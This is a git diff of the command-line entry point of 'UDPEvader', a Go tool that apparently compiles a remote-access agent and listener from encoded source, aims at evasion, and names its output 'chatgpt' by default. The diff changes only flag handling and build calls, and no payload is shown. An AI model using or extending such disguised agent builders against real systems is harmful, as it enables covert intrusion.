@@ -5,6 +5,7 @@ import (
 	"UDPEvader/src/sourcegen"
 	"flag"
 	"fmt"
+	"runtime"
 	"time"
 )
 
@@ -13,9 +14,11 @@ func main() {
 	cmdargrhost := flag.String("rhost", "127.0.0.1", "If not provided, default will be 127.0.0.1")
 	cmdargrport := flag.Int("rport", 8080, "If not provided, default will be 8080")
 	cmdargapptype := flag.String("bintype", "console", "If not provided, default will be console")
-	cmdargtargetos := flag.String("targetos", "windows", "If not provided, default will windows")
-	cmdargtargetarch := flag.String("targetarch", "386", "If not provided, default will 32 bit")
-	cmdargsaveas := flag.String("saveas", "chatgpt", "If not provided, default will 32 bit chatgpt")
+	cmdagentos := flag.String("agentos", "windows", "If not provided, default will be current OS")
+	cmdagentarch := flag.String("agentarch", "386", "If not provided, default will be current OS architecture")
+	cmdlisteneros := flag.String("listeneros", "windows", "If not provided, default will be current OS")
+	cmdlistenerarch := flag.String("listenerarch", "amd64", "If not provided, default will be current OS architecture bit")
+	cmdargsaveas := flag.String("saveas", "chatgpt", "If not provided, default will be chatgpt")
 
 	flag.Parse()
 
@@ -34,15 +37,25 @@ func main() {
 	} else {
 		oUserOptions.AppType = *cmdargapptype
 	}
-	if flag.Lookup("targetos") == nil {
-		oUserOptions.TargetOS = "windows"
+	if flag.Lookup("agentos") == nil {
+		oUserOptions.AgentOS = runtime.GOOS
 	} else {
-		oUserOptions.TargetOS = *cmdargtargetos
+		oUserOptions.AgentOS = *cmdagentos
 	}
-	if flag.Lookup("targetarch") == nil {
-		oUserOptions.TargetArch = "386"
+	if flag.Lookup("agentarch") == nil {
+		oUserOptions.AgentArch = runtime.GOARCH
 	} else {
-		oUserOptions.TargetArch = *cmdargtargetarch
+		oUserOptions.AgentArch = *cmdagentarch
+	}
+	if flag.Lookup("listeneros") == nil {
+		oUserOptions.ListenerOS = runtime.GOOS
+	} else {
+		oUserOptions.ListenerOS = *cmdlisteneros
+	}
+	if flag.Lookup("listenerarch") == nil {
+		oUserOptions.ListenerArch = runtime.GOARCH
+	} else {
+		oUserOptions.ListenerArch = *cmdlistenerarch
 	}
 
 	if flag.Lookup("saveas") == nil {
@@ -58,7 +71,7 @@ func main() {
 	oUserOptions.UpdateSourceCode(false)
 	oUserOptions.CreateSourceFile()
 	agentfinflag := make(chan string)
-	go oUserOptions.SourceToBinary(agentfinflag)
+	go oUserOptions.SourceToBinary(false, agentfinflag)
 	<-agentfinflag
 
 	oDecoder.DecodeSource(sourcegen.EncodedListener)
@@ -66,7 +79,7 @@ func main() {
 	oUserOptions.UpdateSourceCode(true)
 	oUserOptions.CreateSourceFile()
 	listenerfinflag := make(chan string)
-	go oUserOptions.SourceToBinary(listenerfinflag)
+	go oUserOptions.SourceToBinary(true, listenerfinflag)
 	<-listenerfinflag
 
 	time.Sleep(3 * time.Second)
